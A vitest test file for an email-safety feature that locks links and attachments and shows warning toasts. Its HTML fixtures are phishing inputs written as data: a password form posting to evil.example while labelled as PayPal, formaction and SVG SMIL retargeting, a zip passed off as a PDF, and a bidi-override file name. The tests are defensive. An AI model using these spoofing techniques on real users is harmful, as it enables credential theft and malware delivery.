// @vitest-environment happy-dom
// The paused-link and blocked-attachment toasts tell the user where a blocked action goes or which file was
// blocked. The email's HTML can write page-visible data-ped-* attributes of its own, so the toast must only use what
// the lock recorded in the isolated world (or live attributes), never those copies: otherwise a form posting to
// evil.example says it "goes to www.paypal.com", and invoice.zip is announced as invoice.pdf.
import { beforeEach, describe, expect, it, vi } from 'vitest';

const toasts = vi.hoisted(() => ({ link: [] as string[], attachment: [] as string[] }));
vi.mock('./linkToast', () => ({
  showPausedLinkToast: (_doc: Document, host: string) => void toasts.link.push(host),
  showPausedAttachmentToast: (_doc: Document, name: string) => void toasts.attachment.push(name),
  removePausedLinkToast: () => {},
}));

import { lockAttachments, lockedAttachmentName, unlockAttachments } from './attachmentLock';
import { lockLinks, unlockLinks } from './linkLock';

const $ = (id: string) => document.getElementById(id)!;
const click = (el: Element) => el.dispatchEvent(new MouseEvent('click', { bubbles: true, cancelable: true }));

beforeEach(() => {
  toasts.link.length = 0;
  toasts.attachment.length = 0;
});

describe('paused-link toast', () => {
  it('names the real form action, not a data-ped-href the email put on the form', () => {
    document.body.innerHTML = `<div id="m">
      <form id="f" data-ped-href="https://www.paypal.com/signin" action="https://evil.example/collect">
        <input name="pw"><button id="b">Sign in</button></form></div>`;
    lockLinks($('m'));
    click($('b'));
    expect(toasts.link).toEqual(['evil.example']);
    unlockLinks($('m'));
  });

  it('names the real formaction, not a seeded data-ped-formaction around the button', () => {
    document.body.innerHTML = `<div id="m"><form action="https://evil.example/collect">
      <div data-ped-formaction="https://www.paypal.com/"><button id="b">Sign in</button></div>
      <button id="c" formaction="https://other.example/x" data-ped-href="https://www.paypal.com/">Go</button>
    </form></div>`;
    lockLinks($('m'));
    click($('b'));
    click($('c'));
    expect(toasts.link).toEqual(['evil.example', 'other.example']);
    unlockLinks($('m'));
  });

  it('names no host for an SVG link retargeted by SMIL with a seeded data-ped-href', () => {
    document.body.innerHTML = `<div id="m"><svg><a id="s" data-ped-href="https://www.paypal.com/">
      <set attributeName="href" to="https://evil.example/"/><text id="t">Pay</text></a></svg></div>`;
    lockLinks($('m'));
    click($('t'));
    expect(toasts.link).toEqual(['']);
    unlockLinks($('m'));
  });

  it('still names the host of an ordinary locked link', () => {
    document.body.innerHTML = `<div id="m"><a id="a" href="https://evil.example/login"><span id="sp">Sign in</span></a></div>`;
    lockLinks($('m'));
    // The page rewrites the visible copy after locking; the toast keeps the recorded target.
    $('a').setAttribute('data-ped-href', 'https://www.paypal.com/');
    click($('sp'));
    expect(toasts.link).toEqual(['evil.example']);
    unlockLinks($('m'));
  });
});

describe('blocked-attachment toast', () => {
  it('names the locked attachment, not a data-ped-att-name the email put inside it', () => {
    document.body.innerHTML = `<a id="d" download="invoice.zip" href="data:application/zip,PK"><span id="s"
      data-ped-att-name="invoice.pdf">Invoice</span></a>`;
    lockAttachments([$('d')], new Map([[$('d'), 'invoice.zip']]));
    click($('s'));
    expect(toasts.attachment).toEqual(['invoice.zip']);
    expect(lockedAttachmentName($('s'))).toBe('invoice.zip');
    unlockAttachments([$('d')]);
    expect(lockedAttachmentName($('s'))).toBeNull();
  });

  it('names nothing for a nameless attachment root the email pre-labelled', () => {
    document.body.innerHTML = `<div id="d" data-ped-att-name="invoice.pdf"><span id="s">Download all</span></div>`;
    lockAttachments([$('d')]);
    click($('s'));
    expect(toasts.attachment).toEqual(['']);
    expect(lockedAttachmentName($('s'))).toBeNull();
    unlockAttachments([$('d')]);
  });
});

describe('blocked-attachment toast text', () => {
  it('neutralises bidi controls in the file name', async () => {
    const real = await vi.importActual<typeof import('./linkToast')>('./linkToast');
    const said: string[] = [];
    (document as Document & { ariaNotify?: (m: string) => void }).ariaNotify = (m) => void said.push(m);
    real.showPausedAttachmentToast(document, 'invoice‮fdp.exe');
    real.removePausedLinkToast(document);
    delete (document as Document & { ariaNotify?: unknown }).ariaNotify;
    expect(said).toHaveLength(1);
    expect(said[0]).not.toMatch(/[‪-‮⁦-⁩]/);
    expect(said[0]).toContain('invoice�fdp.exe');
  });
});
